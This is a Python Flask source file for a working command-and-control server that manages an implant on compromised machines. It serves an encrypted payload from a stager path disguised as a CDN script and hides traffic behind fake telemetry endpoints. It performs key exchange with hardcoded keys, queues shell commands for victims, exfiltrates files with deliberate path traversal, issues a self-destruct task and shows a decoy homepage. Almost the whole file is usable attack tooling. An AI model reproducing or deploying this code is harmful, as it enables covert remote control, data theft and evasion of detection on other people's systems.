"""Command and Control HTTP server for communicating with implant"""

from base64 import b64encode, b64decode
import os
import json
import time
from random import randbytes, randrange
from datetime import datetime, timezone

from flask import Flask, request, jsonify, Response
from werkzeug.utils import secure_filename
from cryptography.hazmat.primitives.asymmetric import x25519
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives import serialization

app = Flask(__name__)
HOST = "127.0.0.1" or input("enter your attacker/host/local ip:")
PORT = 8443
CERT_FOLDER = "cert"
UPLOAD_FOLDER = "uploads"
PAYLOAD_FOLDER = "dist"
PAYLOAD_NAME = "d-ISkvI"
STAGER_ENDPOINT = "/cdn/bootstrap.js"
BEACON_ENDPOINT = "/api/telemetry"
RESULTS_ENDPOINT = "/api/updates"
FILE_ENDPOINT = "/api/upload"
tasks = []
results = []
derived_key = None


def encrypt_data(aes_key: bytes, plaintext: bytes | str) -> bytes:
    """Encrypt data using AES-256-GCM with nonce and encode with base64"""
    if isinstance(plaintext, str):
        plaintext = plaintext.encode("utf-8")

    aesgcm = AESGCM(aes_key)
    nonce = os.urandom(12)
    ciphertext = aesgcm.encrypt(nonce, plaintext, None)
    return b64encode(nonce + ciphertext)


def decrypt_data(aes_key: bytes, b64_data: bytes, decode: bool = True):
    """Decrypt data using AES-256-GCM with nonce and decode with base64"""
    data = b64decode(b64_data)
    nonce = data[:12]
    ciphertext_and_tag = data[12:]

    aesgcm = AESGCM(aes_key)
    plaintext = aesgcm.decrypt(nonce, ciphertext_and_tag, None)
    return plaintext if not decode else plaintext.decode("utf-8")


def exchange_keys(client_public_bytes: bytes) -> bytes:
    """
    X25519 key exchange protocol:

    1.  On start, client generates key pair and sends public key in first beacon to server
    2.  Server generates key pair and responds to client with its public key
    3.  Both client and server derive shared secret AES key and use it for following communications
    -   These packets are encrypted with pre-shared key
    -   If client can't connect to server, it will keep retrying with new key pairs
    """
    print("[*] First beacon received from client, exchanging keys")
    # get client public key
    client_public_key = x25519.X25519PublicKey.from_public_bytes(client_public_bytes)

    # generate X25519 keypair
    server_private_key = x25519.X25519PrivateKey.generate()
    server_public_key = server_private_key.public_key()

    # send public key bytes to client
    server_public_bytes = server_public_key.public_bytes(
        encoding=serialization.Encoding.Raw, format=serialization.PublicFormat.Raw
    )

    # compute shared secret
    shared_secret = server_private_key.exchange(client_public_key)

    # derive AES key using HKDF
    shared_key = HKDF(
        algorithm=hashes.SHA256(),
        length=32,
        salt=None,
        info=b"handshake data",
    ).derive(shared_secret)

    # save key to disk for backup
    print(f"[*] Saving to '{CERT_FOLDER}/derived.key'")
    with open(os.path.join(CERT_FOLDER, "derived.key"), "wb") as f:
        f.write(shared_key)

    return shared_key, server_public_bytes


def restore_key() -> bytes:
    """
    If the C2 stops for any reason while the implant is still active, it will lose the derived AES
    key. This would effectively prevent it from communicating with the implant which expects
    encrypted messages, even for stopping the implant or getting a new key since only the client can
    initiate key exchange. If this happens, we attempt to recover it from the backup saved in
    "CERT_FOLDER/derived.key"
    """
    # create dummy "derived.key" if it doesn't exist
    if not os.path.exists(os.path.join(CERT_FOLDER, "derived.key")):
        print(f"[!] '{CERT_FOLDER}/derived.key' not found, creating empty file")
        with open(os.path.join(CERT_FOLDER, "derived.key"), "wb") as f:
            return None

    print("[*] Restoring derived key from last session")
    with open(os.path.join(CERT_FOLDER, "derived.key"), "rb") as f:
        shared_key = f.read()
    return shared_key


@app.route(STAGER_ENDPOINT)
def send_encrypted_payload():
    """
    Attacker calls this from the target to download the encrypted and b64-encoded payload
    """
    print("[*] stager endpoint called, sending encrypted payload")
    # encrypt payload before sending if it doesnt exist
    encrypted_payload_path = os.path.join(PAYLOAD_FOLDER, "encrypted_payload")
    IGNORE_CACHED = True
    if not os.path.exists(encrypted_payload_path) or IGNORE_CACHED:
        encrypted_payload = None
        with open(os.path.join(PAYLOAD_FOLDER, PAYLOAD_NAME), "rb") as f:
            pre_shared_key = bytes.fromhex(
                "65b53ecaba31f22e75e92d9ed95d1bebd233438d72ce2f9f2ac954ca197a679f"
            )
            plain = f.read()
            encrypted_payload = encrypt_data(pre_shared_key, plain)

        with open(encrypted_payload_path, "wb") as f:
            f.write(encrypted_payload)

    # send encrypted payload
    with open(encrypted_payload_path, "rb") as f:
        encrypted_payload = f.read()
        return Response(
            encrypted_payload,
            mimetype="application/octet-stream",
            headers={"Content-Disposition": "attachment; filename=bootstrap.js"},
        )


@app.route(BEACON_ENDPOINT, methods=["POST"])
def beacon():
    """
    When implant requests this endpoint with no data, send its tasks
    If receiving client's first beacon with its public key, send server's public key
    """
    # client's first beacon with public key
    if request.data:
        pre_shared_key = b"]T\xb8\x9e\xc4*}F\x01\xa7\xa30P-Y\xb1\x87W\x07\xe9\xe3\x81\x95r\x11v\n\xf498=\x9f"
        enc = request.get_data()
        client_public_bytes = decrypt_data(pre_shared_key, enc, False)
        global derived_key
        derived_key, server_public_bytes = exchange_keys(client_public_bytes)

        # send server public bytes, then send tasks on the next beacon
        return encrypt_data(pre_shared_key, server_public_bytes)

    # else send task
    response = encrypt_data(derived_key, json.dumps({"tasks": tasks}))
    # clear after sending
    tasks.clear()
    return response


@app.route("/task", methods=["POST"])
def task():
    """
    Operator calls this endpoint with "cmd" (str) param to add tasks (shell cmds)

    For scheduling, there are two (exclusive, optional) choices:

    1. The operator can specify an absolute time at which the task should run with "time" (str)
       param. This takes the format "%Y-%m-%d %H:%M:%S" and gets converted to a unix timestamp
       before sending to the implant. If the date has already passed, then it runs immediately

    2. Or, the operator can specify when to run the task after a delay with "delay" (str) param that
       takes format "dd:hh:mm:ss", but there may be any number of units (e.g. "0:10:200:3000" or
       ":::5" are both valid). This gets converted into a seconds duration before sending to the
       implant. Note that the delay starts when the implant receives the command, not when the
       operator sends it

    If both scheduling options are given, the absolute time takes precedence. If none are given,
    then the task runs immediately when the implant receives it.

    Implant receives tasks when pinging BEACON_ENDPOINT
    Implant uploads results to RESULTS_ENDPOINT
    """
    data = request.json
    print("[*] TASKS:", data)
    cmd: str = data.get("cmd")
    abs_time_local: str = data.get("time")
    duration: str = data.get("delay")
    timestamp = None

    if not cmd:
        return "[!] missing 'cmd' param\n", 400
    if abs_time_local:
        timestamp = (
            datetime.strptime(abs_time_local, "%Y-%m-%d %H:%M:%S")
            .astimezone(timezone.utc)
            .timestamp()
        )
    if not duration:
        duration = "00:00:00:00"

    delay_seconds = parse_duration(duration)
    if delay_seconds is None:
        return "[!] delay must be in dd:hh:mm:ss format, task aborted\n", 400

    if timestamp:
        add_task(cmd, abs_time=timestamp)
        return f"[*] added task `{cmd}` to run at {timestamp}"

    add_task(cmd, delay_seconds=delay_seconds)
    return f"[*] added task `{cmd}` with {delay_seconds} second delay"


def add_task(cmd: str, abs_time: float = 0, delay_seconds: int = 0):
    """Adds scheduled task as a dict with "cmd" and "delay" fields"""
    scheduled_task = {"cmd": cmd, "delay": delay_seconds}
    if abs_time:
        scheduled_task["time"] = abs_time
    print(scheduled_task)
    tasks.append(scheduled_task)


def parse_duration(delay: str) -> int | None:
    """Converts delay duration string to seconds"""
    # separate time units and convert ":::" to "0:0:0:0"
    parts = [int(p) if p else 0 for p in delay.strip().split(":")]
    if len(parts) != 4:
        return None

    # convert to seconds
    days, hours, minutes, seconds = map(int, parts)
    return days * 86400 + hours * 3600 + minutes * 60 + seconds


@app.route(RESULTS_ENDPOINT, methods=["POST"])
def task_result():
    """Implant uses this endpoint to upload results of tasks"""
    enc = request.get_data().decode()
    plain = decrypt_data(derived_key, enc)
    json_data = json.loads(plain)
    print("[*] RESULT", json_data)

    result = json_data.get("result")
    results.append(result)

    # return dummy data
    return encrypt_data(derived_key, randbytes(randrange(128, 256)))


@app.route("/exfil", methods=["POST"])
def queue_exfil():
    """
    Operator calls this with "files" (list[str]) param to tell implant which files to exfiltrate

    The operator can optionally specify when to run the task at a specific time with "time" (str)
    param or after a delay with "delay" (str) param. See task() for details

    Implant will respond to FILE_ENDPOINT
    """
    data = request.json
    files: str = data.get("files")
    abs_time_local: str = data.get("time")
    duration: str = data.get("delay")
    timestamp = None

    # allow inputting single files
    if isinstance(files, str):
        files = [files]
    # ensure files is list[str]
    if (not files or not isinstance(files, list)) or (
        files and not isinstance(files[0], str)
    ):
        return "[!] Request must include 'files' param as list[str]\n", 400

    if abs_time_local:
        timestamp = (
            datetime.strptime(abs_time_local, "%Y-%m-%d %H:%M:%S")
            .astimezone(timezone.utc)
            .timestamp()
        )
    if not duration:
        duration = "00:00:00:00"

    delay_seconds = parse_duration(duration)
    if delay_seconds is None:
        return "[!] delay must be in dd:hh:mm:ss format, task aborted\n", 400

    for filename in files:
        # don't secure filename because we want file traversal with '../'
        if timestamp:
            add_task(f"FILE {filename}", abs_time=timestamp)
            time_status = f"exfil at {timestamp}"
        else:
            add_task(f"FILE {filename}", delay_seconds)
            time_status = f"exfil after {delay_seconds} second delay"

    return f"[*] {len(files)} files added, {time_status}"


@app.route(FILE_ENDPOINT, methods=["POST"])
def recv_file():
    """
    Implant uses this endpoint to upload encrypted files in "files" field
    Decrypted files are uploaded in UPLOAD_FOLDER with a timestamp appended
    """
    # decrypt file
    enc_file = request.files.get("file")  # flask FileStorage object
    file_bytes = decrypt_data(derived_key, enc_file.read(), False)

    # upload to UPLOAD_FOLDER/filename_<timestamp>
    filename = decrypt_data(derived_key, enc_file.filename)
    sec_filename = secure_filename(filename + f"_{int(time.time())}")

    if not os.path.exists(UPLOAD_FOLDER):
        os.mkdir(UPLOAD_FOLDER)
    with open(os.path.join(UPLOAD_FOLDER, sec_filename), "wb") as f:
        f.write(file_bytes)

    # return dummy data
    return encrypt_data(derived_key, randbytes(randrange(32, 64)))


@app.route("/destroy", methods=["POST"])
def destroy():
    """
    Operator calls this to append final "destroy" task

    The operator can optionally specify when to run the task at a specific time with "time" (str)
    param or after a delay with "delay" (str) param. See task() for details
    """
    data = request.json
    delay = data.get("delay")

    if not delay:
        delay = "00:00:00:00"
    delay_seconds = parse_duration(delay)
    if delay_seconds is None:
        return "[!] delay must be in dd:hh:mm:ss format, destroy aborted\n", 400

    add_task("DESTROY", delay_seconds)
    return f"[*] sent destroy task with {delay_seconds} second delay"


@app.route("/view")
def view_results():
    """Operator calls this endpoint to view results"""
    return jsonify(results)


@app.route("/")
def show_homepage():
    return "<center><h1>totally legitimate app, nothing to see here\n</h1></center>"


if __name__ == "__main__":
    context = (
        os.path.join(CERT_FOLDER, "server.crt"),
        os.path.join(CERT_FOLDER, "server.key"),
    )
    derived_key = restore_key()
    app.run(host=HOST, port=PORT, ssl_context=context)
